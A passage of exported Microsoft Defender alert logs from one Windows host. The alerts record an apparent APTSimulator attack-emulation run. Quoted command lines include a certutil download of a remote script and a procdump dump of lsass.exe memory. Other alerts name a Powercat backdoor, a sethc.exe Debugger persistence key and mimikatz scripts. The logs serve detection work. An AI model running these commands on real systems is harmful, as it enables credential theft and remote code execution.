Unused:","810bfd3a-9fb3-44e0-9016-8cdf785fddbf"
"2022-05-08 21:06:33.528 +02:00","Defender Alert (Severe)","crit","PEGASUS01","Defender",1116,113,"Threat: Backdoor:PowerShell/Powercat.A ¦ Severity: Severe ¦ Type: Backdoor ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\TMP\nc.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 6 ¦ Detection ID: {9BD7D993-77BF-4EB2-B009-8A2271E9E0B0} ¦ Detection Time: 2022-05-08T19:06:33.492Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 1 ¦ Execution Name: Suspended ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Backdoor:PowerShell/Powercat.A&threatid=2147745713&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 5 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147745713 ¦ Type ID: 0 ¦ Type Name: Concrete ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","810bfd3a-9fb3-44e0-9016-8cdf785fddbf"
"2022-05-08 21:07:06.737 +02:00","Defender Alert (Severe)","crit","PEGASUS01","Defender",1116,142,"Threat: Trojan:Win32/Ceprolad.A ¦ Severity: Severe ¦ Type: Trojan ¦ User: NT AUTHORITY\SYSTEM ¦ Path: CmdLine:_C:\Windows\System32\cmd.exe /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/NextronSystems/APTSimulator/master/download/cactus.js C:\Users\Public\en-US.js ¦ Proc: Unknown","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 8 ¦ Detection ID: {9C9EA944-BC65-4323-B075-D8F3C31F0D90} ¦ Detection Time: 2022-05-08T19:07:06.727Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 0 ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Ceprolad.A&threatid=2147726914&enterprise=0 ¦ Origin ID: 0 ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 5 ¦ Source ID: 2 ¦ Source Name: System ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147726914 ¦ Type ID: 0 ¦ Type Name: Concrete ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","810bfd3a-9fb3-44e0-9016-8cdf785fddbf"
"2022-05-08 21:09:31.764 +02:00","Defender Alert (Severe)","crit","PEGASUS01","Defender",1116,153,"Threat: Trojan:Script/Wacatac.B!ml ¦ Severity: Severe ¦ Type: Trojan ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\TMP\schtasks-backdoor.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 8 ¦ Detection ID: {F4EB612D-601D-43AE-BB2C-CC2553E62313} ¦ Detection Time: 2022-05-08T19:09:31.186Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 1 ¦ Execution Name: Suspended ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Script/Wacatac.B!ml&threatid=2147735503&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 5 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147735503 ¦ Type ID: 8 ¦ Type Name: FastPath ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","810bfd3a-9fb3-44e0-9016-8cdf785fddbf"
"2022-05-08 21:09:42.453 +02:00","Defender Alert (Severe)","crit","PEGASUS01","Defender",1116,154,"Threat: Behavior:Win32/AccessibilityEscalation.F ¦ Severity: Severe ¦ Type: Suspicious Behavior ¦ User: ¦ Path: behavior:_pid:9820:237165111778183; process:_pid:9820,ProcessStart:132965105824158343 ¦ Proc: Unknown","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 46 ¦ Detection ID: {DA1D3FEF-DC92-4CA6-AABD-22D55D9218E2} ¦ Detection Time: 2022-05-08T19:09:42.451Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 3 ¦ Execution Name: Executing ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Behavior:Win32/AccessibilityEscalation.F&threatid=2147727883&enterprise=0 ¦ Origin ID: 0 ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 5 ¦ Source ID: 0 ¦ State: 1 ¦ Status Code: 1 ¦ Threat ID: 2147727883 ¦ Type ID: 0 ¦ Type Name: Concrete","810bfd3a-9fb3-44e0-9016-8cdf785fddbf"
"2022-05-08 21:09:42.472 +02:00","Defender Alert (Severe)","crit","PEGASUS01","Defender",1116,155,"Threat: Behavior:Win32/AccessibilityEscalation.F ¦ Severity: Severe ¦ Type: Suspicious Behavior ¦ User: ¦ Path: behavior:_pid:9820:237165111778183; process:_pid:9820,ProcessStart:132965105824158343 ¦ Proc: Unknown","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 46 ¦ Detection ID: {DA1D3FEF-DC92-4CA6-AABD-22D55D9218E2} ¦ Detection Time: 2022-05-08T19:09:42.451Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 3 ¦ Execution Name: Executing ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Behavior:Win32/AccessibilityEscalation.F&threatid=2147727883&enterprise=0 ¦ Origin ID: 0 ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 5 ¦ Source ID: 0 ¦ State: 1 ¦ Status Code: 1 ¦ Threat ID: 2147727883 ¦ Type ID: 0 ¦ Type Name: Concrete","810bfd3a-9fb3-44e0-9016-8cdf785fddbf"
"2022-05-08 21:09:51.407 +02:00","Defender Alert (Severe)","crit","PEGASUS01","Defender",1116,168,"Threat: Behavior:Win32/AccessibilityEscalation.F ¦ Severity: Severe ¦ Type: Suspicious Behavior ¦ User: NT AUTHORITY\SYSTEM ¦ Path: behavior:_pid:9820:237165111778183; regkeyvalue:_HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\\Debugger ¦ Proc: Unknown","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 46 ¦ Detection ID: {1E348841-DA64-46DE-86A7-6D6E9EA48F9A} ¦ Detection Time: 2022-05-08T19:09:51.397Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 0 ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Behavior:Win32/AccessibilityEscalation.F&threatid=2147727883&enterprise=0 ¦ Origin ID: 0 ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 5 ¦ Source ID: 2 ¦ Source Name: System ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147727883 ¦ Type ID: 0 ¦ Type Name: Concrete ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","810bfd3a-9fb3-44e0-9016-8cdf785fddbf"
"2022-05-08 21:09:51.411 +02:00","Defender Alert (Severe)","crit","PEGASUS01","Defender",1116,169,"Threat: Behavior:Win32/AccessibilityEscalation.F ¦ Severity: Severe ¦ Type: Suspicious Behavior ¦ User: NT AUTHORITY\SYSTEM ¦ Path: behavior:_pid:9820:237165111778183; regkeyvalue:_HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\\Debugger ¦ Proc: Unknown","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 46 ¦ Detection ID: {1E348841-DA64-46DE-86A7-6D6E9EA48F9A} ¦ Detection Time: 2022-05-08T19:09:51.397Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 0 ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Behavior:Win32/AccessibilityEscalation.F&threatid=2147727883&enterprise=0 ¦ Origin ID: 0 ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 5 ¦ Source ID: 2 ¦ Source Name: System ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147727883 ¦ Type ID: 0 ¦ Type Name: Concrete ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","810bfd3a-9fb3-44e0-9016-8cdf785fddbf"
"2022-05-08 21:06:43.306 +02:00","Defender Alert (High)","high","PEGASUS01","Defender",1116,114,"Threat: HackTool:Win32/DumpLsass.E ¦ Severity: High ¦ Type: Tool ¦ User: NT AUTHORITY\SYSTEM ¦ Path: CmdLine:_C:\Users\Public\procdump64.exe -accepteula -ma lsass.exe C:\TMP\somethingwindows.dmp ¦ Proc: Unknown","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 34 ¦ Detection ID: {5035DAF6-ECD0-453B-8A51-03B5BD0F66EF} ¦ Detection Time: 2022-05-08T19:06:43.302Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 0 ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/DumpLsass.E&threatid=2147786200&enterprise=0 ¦ Origin ID: 0 ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 4 ¦ Source ID: 2 ¦ Source Name: System ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147786200 ¦ Type ID: 0 ¦ Type Name: Concrete ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","1e11c0f0-aecd-45d8-9229-da679c0265ea"
"2022-05-08 21:04:53.529 +02:00","Antivirus Exploitation Framework Detection","crit","PEGASUS01","Defender",1116,107,"Threat: Trojan:Win32/Powersploit!ml ¦ Severity: Severe ¦ Type: Trojan ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\Users\IEUser\AppData\Local\Temp\APTSimulator\test-sets\credential-access\mimikatz-1.bat ¦ Proc: C:\Windows\explorer.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 8 ¦ Detection ID: {D7193C84-A3A6-4192-95C6-99F88759F52F} ¦ Detection Time: 2022-05-08T19:04:53.046Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 1 ¦ Execution Name: Suspended ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Powersploit!ml&threatid=2147760510&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 5 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147760510 ¦ Type ID: 8 ¦ Type Name: FastPath ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","1868a1c5-30e8-dffd-a373-90c72ea4921a"
"2022-05-08 21:04:56.600 +02:00","Antivirus Exploitation Framework Detection","crit","PEGASUS01","Defender",1116,109,"Threat: Trojan:Win32/Powersploit!ml ¦ Severity: Severe ¦ Type: Trojan ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\Users\IEUser\AppData\Local\Temp\APTSimulator\test-sets\credential-access\mimikatz-1.bat; file:_C:\Users\IEUser\AppData\Local\Temp\dist\APTSimulator\test-sets\credential-access\mimikatz-1.bat ¦ Proc: C:\Windows\explorer.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 8 ¦ Detection ID: {D7193C84-A3A6-4192-95C6-99F88759F52F} ¦ Detection Time: 2022-05-08T19:04:53.046Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 1 ¦ Execution Name: Suspended ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Powersploit!ml&threatid=2147760510&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 5 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147760510 ¦ Type ID: 8 ¦ Type Name: FastPath ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","1868a1c5-30e8-dffd-a373-90c72ea4921a"
"2022-05-08 21:04:53.529 +02:00","Antivirus Hacktool Detection","high","PEGASUS01","Defender",1116,107,"Threat: Trojan:Win32/Powersploit!ml ¦ Severity: Severe ¦ Type: Trojan ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\Users\IEUser\AppData\Local\Temp\APTSimulator\test-sets\credential-access\mimikatz-1.bat ¦ Proc: C:\Windows\explorer.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 8 ¦ Detection ID: {D7193C84-A3A6-4192-95C6-99F88759F52F} ¦ Detection Time: 2022-05-08T19:04:53.046Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 1 ¦ Execution Name: Suspended ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Powersploit!ml&threatid=2147760510&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 5 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147760510 ¦ Type ID: 8 ¦ Type Name: FastPath ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","f3d20838-65fe-0575-52a9-fd41ce2a5fdd"
"2022-05-08 21:04:56.600 +02:00","Antivirus Hacktool Detection","high","PEGASUS01","Defender",1116,109,"Threat: Trojan:Win32/Powersploit!ml ¦ Severity: Severe ¦ Type: Trojan ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\Users\IEUser\AppData\Local\Temp\APTSimulator\test-sets\credential-access\mimikatz-1.bat; file:_C:\Users\IEUser\AppData\Local\Temp\dist\APTSimulator\test-sets\credential-access\mimikatz-1.bat ¦ Proc: C:\Windows\explorer.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 8 ¦ Detection ID: {D7193C84-A3A6-4192-95C6-99F88759F52F} ¦ Detection Time: 2022-05-08T19:04:53.046Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 1 ¦ Execution Name: Suspended ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Powersploit!ml&threatid=2147760510&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 5 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147760510 ¦ Type ID: 8 ¦ Type Name: FastPath ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","f3d20838-65fe-0575-52a9-fd41ce2a5fdd"
"2022-05-08 21:06:43.306 +02:00","Antivirus Hacktool Detection","high","PEGASUS01","Defender",1116,114,"Threat: HackTool:Win32/DumpLsass.E ¦ Severity: High ¦ Type: Tool ¦ User: NT AUTHORITY\SYSTEM ¦ Path: CmdLine:_C:\Users\Public\procdump64.exe -accepteula -ma lsass.exe C:\TMP\somethingwindows.dmp ¦ Proc: Unknown","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 34 ¦ Detection ID: {5035DAF6-ECD0-453B-8A51-03B5BD0F66EF} ¦ Detection Time: 2022-05-08T19:06:43.302Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 0 ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/DumpLsass.E&threatid=2147786200&enterprise=0 ¦ Origin ID: 0 ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 4 ¦ Source ID: 2 ¦ Source Name: System ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147786200 ¦ Type ID: 0 ¦ Type Name: Concrete ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","f3d20838-65fe-0575-52a9-fd41ce2a5fdd"
"2022-05-08 21:06:43.306 +02:00","Antivirus Password Dumper Detection","crit","PEGASUS01","Defender",1116,114,"Threat: HackTool:Win32/DumpLsass.E ¦ Severity: High ¦ Type: Tool ¦ User: NT AUTHORITY\SYSTEM ¦ Path: CmdLine:_C:\Users\Public\procdump64.exe -accepteula -ma lsass.exe C:\TMP\somethingwindows.dmp ¦ Proc: Unknown","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 34 ¦ Detection ID: {5035DAF6-ECD0-453B-8A51-03B5BD0F66EF} ¦ Detection Time: 2022-05-08T19:06:43.302Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 0 ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/DumpLsass.E&threatid=2147786200&enterprise=0 ¦ Origin ID: 0 ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 4 ¦ Source ID: 2 ¦ Source Name: System ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147786200 ¦ Type ID: 0 ¦ Type Name: Concrete ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","46fc2e9f-df4e-8628-05d5-39bc97b56bab"
"2022-05-08 21:04:52.827 +02:00","Antivirus Relevant File Paths Alerts","high","PEGASUS01","Defender",1116,105,"Threat: Trojan:BAT/Vigorf.A ¦ Severity: Severe ¦ Type: Trojan ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\Users\IEUser\AppData\Local\Temp\APTSimulator\test-sets\command-and-control\wmi-backdoor-c2.bat ¦ Proc: C:\Windows\explorer.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 8 ¦ Detection ID: {3D6C0D67-CE0F-46AE-B9A6-DC31AFAFB0B7} ¦ Detection Time: 2022-05-08T19:04:52.390Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 1 ¦ Execution Name: Suspended ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:BAT/Vigorf.A&threatid=2147714419&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 5 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147714419 ¦ Type ID: 8 ¦ Type Name: FastPath ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","a1be9170-2ada-e8bb-285c-3e1ff336189e"
"2022-05-08 21:04:53.529 +02:00","Antivirus Relevant File Paths Alerts","high","PEGASUS01","Defender",1116,107,"Threat: Trojan:Win32/Powersploit!ml ¦ Severity: Severe ¦ Type: Trojan ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\Users\IEUser\AppData\Local\Temp\APTSimulator\test-sets\credential-access\mimikatz-1.bat ¦ Proc: C:\Windows\explorer.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 8 ¦ Detection ID: {D7193C84-A3A6-4192-95C6-99F88759F52F} ¦ Detection Time: 2022-05-08T19:04:53.046Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 1 ¦ Execution Name: Suspended ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Powersploit!ml&threatid=2147760510&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 5 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147760510 ¦ Type ID: 8 ¦ Type Name: FastPath ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","a1be9170-2ada-e8bb-285c-3e1ff336189e"
"2022-05-08 21:04:56.552 +02:00","Antivirus Relevant File Paths Alerts","high","PEGASUS01","Defender",1116,108,"Threat: Trojan:BAT/Vigorf.A ¦ Severity: Severe ¦ Type: Trojan ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\Users\IEUser\AppData\Local\Temp\APTSimulator\test-sets\command-and-control\wmi-backdoor-c2.bat; file:_C:\Users\IEUser\AppData\Local\Temp\dist\APTSimulator\test-sets\command-and-control\wmi-backdoor-c2.bat ¦ Proc: C:\Windows\explorer.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 8 ¦ Detection ID: {3D6C0D67-CE0F-46AE-B9A6-DC31AFAFB0B7} ¦ Detection Time: 2022-05-08T19:04:52.390Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 1 ¦ Execution Name: Suspended ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:BAT/Vigorf.A&threatid=2147714419&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 5 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147714419 ¦ Type ID: 8 ¦ Type Name: FastPath ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","a1be9170-2ada-e8bb-285c-3e1ff336189e"
"2022-05-08 21:04:56.600 +02:00","Antivirus Relevant File Paths Alerts","high","PEGASUS01","Defender",1116,109,"Threat: Trojan:Win32/Powersploit!ml ¦ Severity: Severe ¦ Type: Trojan ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\Users\IEUser\AppData\Local\Temp\APTSimulator\test-sets\credential-access\mimikatz-1.bat; file:_C:\Users\IEUser\AppData\Local\Temp\dist\APTSimulator\test-sets\credential-access\mimikatz-1.bat ¦ Proc: C:\Windows\explorer.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 8 ¦ Detection ID: {D7193C84-A3A6-4192-95C6-99F88759F52F} ¦ Detection Time: 2022-05-08T19:04:53.046Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 1 ¦ Execution Name: Suspended ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Powersploit!ml&threatid=2147760510&enterprise=0 ¦ Origin ID: 1 ¦ 